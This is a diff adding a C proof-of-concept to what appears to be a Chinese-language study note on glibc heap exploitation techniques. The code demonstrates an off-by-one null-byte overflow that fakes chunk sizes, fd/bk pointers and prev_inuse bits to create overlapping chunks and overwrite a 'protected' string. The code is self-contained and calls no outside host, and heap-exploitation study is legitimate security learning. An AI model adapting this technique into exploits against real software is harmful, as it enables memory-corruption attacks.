@@ -950,7 +950,43 @@ int main(int argc, char const *argv[])
 }
 ```
 3. 减小使用中chunksize
+```c
+#include<stdlib.h>
+#include<stdio.h>
+#include<string.h>
+int main(int argc, char const *argv[])
+{
+    printf("off by one in glibc <2.35\n");
+    char *a=malloc(0x108);
+    char *b=malloc(0x500);
+    char *c=malloc(0x500);
+    char * protected_string=a+0xf0;
+    strcpy(protected_string,"please change me!");
 
+    // fake next chunk  prev_size
+    *(a+0x100)=0x20;
+    //fake size
+    *(a+0xe0+0x8)=0x20;
+    //assume we know a pointer point to a internel;
+    char * fake_chunk=(a+0xe0);
+    //fake fd and bk
+    *(size_t *)(a+0xe0+0x10)=(size_t)&fake_chunk-0x18;
+    *(size_t *)(a+0xe0+0x18)=(size_t)&fake_chunk-0x10;
+    //fake prev_inuse to bypass double fre;
+    *(b+0x4f8)=0x21;
+    // overflow!
+    *(a+0x108)=0x00;
+    //fake next size
+    *(c+8)=0x1;
+
+    free(b);
+    // overflow to b->size
+    char *evil=malloc(0x30);
+    strcpy(evil,"hahahahahahaha");
+    printf("b2:%s\n",a+0xf0);
+    return 0;
+}
+```
 
 ## house_of_orange
 
